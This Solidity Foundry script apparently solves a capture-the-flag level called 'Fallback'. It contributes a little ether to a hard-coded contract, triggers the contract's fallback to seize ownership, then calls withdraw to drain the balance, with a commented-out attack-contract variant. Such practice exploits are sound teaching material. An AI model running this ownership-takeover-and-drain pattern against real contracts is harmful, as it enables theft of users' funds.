// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../src/interfaces/IFallback.sol";
//import "../../src/attacks/level01/Attack.sol";

contract FallbackAttackScript is Script {

    function run() external {

        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);

        address targetAddr = 0x7F5B7D484500b708bd5D14Ac8674fa7928Aa85d3;
        IFallback target = IFallback(targetAddr);

        target.contribute{value: 0.0001 ether}();

        (bool success, ) = payable(targetAddr).call{value: 0.0001 ether}("");
        require(success);

        target.withdraw();
        /*
        // 部署攻击合约
        FallbackAttack attacker = new FallbackAttack(targetAddr);
        // 执行攻击
        attacker.attack{value: 0.001 ether}();*/

        vm.stopBroadcast();
    }
}
